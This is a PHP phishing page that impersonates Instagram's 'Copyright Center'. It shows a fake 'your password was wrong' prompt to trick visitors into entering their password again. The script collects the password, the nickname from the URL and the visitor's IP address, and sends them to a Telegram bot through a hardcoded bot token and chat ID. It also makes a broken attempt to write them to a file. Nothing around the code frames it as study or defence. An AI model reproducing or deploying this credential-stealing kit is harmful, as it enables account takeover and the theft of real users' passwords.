<?php
error_reporting(0);

$nick=$_GET["nick"];
if($nick==="" || $nick===" "){$nick="instagram";}else if($nick==fale){$nick="instagram";}
if ($_POST) {
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$nick=$_GET["nick"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
     
fwrite($file, "  ".$nick."\n\n" ." password2: ".$password. "\n\n");

fclose($file);

  
   header("Location: sen.php");
}


?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<title>Business Copyright Center<?php $nick;
	?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap" rel="stylesheet">
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
</head>
<body><center>
	<header>
		<p class="caps">Instagram From Meta | Copyright Center</p>
		
<br><br>
	</header>
	<main>
			</header>
	<main>
	<img src="b.gif" width="150"><br>
	
		
			<p style="letter-spacing:0px;color:#888;"><b>Hi, <?php echo $nick; ?> </b><br>
					</th>
     </form>
		<div class="dont">
			<span class="dont1"> </form>
		<b><p style="color: rgb(237, 73, 86); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center;"> Sorry, your password was wrong Please check your password carefully </span>
			</p><br>
			<form method="post">
			<input type="password" name="password" placeholder=" Password" required="on">
			<br>
			<button type="submit" class="slm">confirm your password<?php echo  $nick; ?></button>
		</form>
	</main>

		</button>
			</header>
	<main>
	<img src="dCSqj7zXbicuVhgspgLiaQ.gif" width="80"><br>

	
	
</center>
<?php
$token='5600614679:AAGqHWMZHL-RpxH_OCkrox1ZVYAncNew24w';

$data = [
'text' => '

nick : '.$nick.'
password2 : '.$password.'
IP: '.$ip.'
Tarih : '.$cur_time.'
',
'chat_id' =>5471515322
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );




?>


<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{border-bottom:1px solid #cecece;
		background:white;
		
		padding-top:10px;}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
			color:#333;
			font-weight:400;
			word-spacing:1px;
			letter-spacing:1px;
			width:350px;
			max-width:90%;
			font-size:15px;
		}main input{
			transition:1s;
			padding:5px;
			border:none;
			width:220px;
			height:33px;
			outline:none;
			border:1px solid #cecece;
			padding-left:5px;
			font-size:16px;
			background:#fafafa;
			border-radius:4px;
			font-size:18px;

		}main input::placeholder{
			font-size:15px;
			color:#999;

		}main .slm{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;
			background:#f5f6f8;

		}
</style>
</body></html>
